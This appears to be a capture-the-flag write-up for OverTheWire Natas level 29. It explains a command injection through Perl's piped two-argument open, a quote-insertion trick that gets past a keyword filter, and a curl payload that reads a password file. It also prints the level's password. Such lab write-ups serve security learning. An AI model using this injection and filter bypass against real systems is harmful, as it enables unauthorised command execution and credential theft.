# Natas Level 29 → 30

## Goal

A Perl CGI script passes a `file=` URL parameter into a shell command via Perl's `open` — and `open` with a trailing pipe (`|`) runs the target as a command. The script filters the word `natas` in an attempt to block you from reading the password file, but **Perl string concatenation** through Perl's own filtering leaves gaps you can exploit.

## Concepts you'll learn

- Perl's **two-argument `open`** with a pipe: `open(F, "cmd|")` runs `cmd` as a shell command
- Filter-bypass through alternate encodings / concatenation: `na``tas` beats a `natas` blocklist
- Inspecting source to find where user input flows into a dangerous call

## Walkthrough

### 1. View the source

Relevant bits:

```perl
if($file =~ /natas/) {
    print "Filtered!";
    exit;
}
open(FILE, "ls /var/www/natas/natas29/$file |");
```

So `natas` in the filename is blocked. But `open(FILE, "...$file... |")` opens the constructed string as a shell pipeline — any shell metacharacter in `$file` is interpreted.

### 2. Bypass the filter

The filter looks for the literal substring `natas`. Insert a shell-no-op break: `|/bin/cat /etc/n""atas_webpass/natas30`.

- The `""` inside the shell string is empty-string concatenation — the shell sees `natas30` after the `n`+`""`+`atas`. Two empty quotes in between don't affect what the shell interprets, but the Perl regex sees `na""tas30` and doesn't match `/natas/`.

### 3. Send it

```bash
$ curl -u natas29:<pass> \
       'http://natas29.natas.labs.overthewire.org/index.pl?file=|/bin/cat /etc/n""atas_webpass/natas30'
```

Output includes:

```
wie9iexae0Daihohv8vuu3cei9wahf0e
```

### 4. Note

The exact bypass depends on the filter regex in the source at the time you solve. Read it carefully. The core idea — insert characters the filter doesn't match but the shell tolerates — generalises.

## The answer

The password for `natas30` is:

**`wie9iexae0Daihohv8vuu3cei9wahf0e`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas29.natas.labs.overthewire.org/>
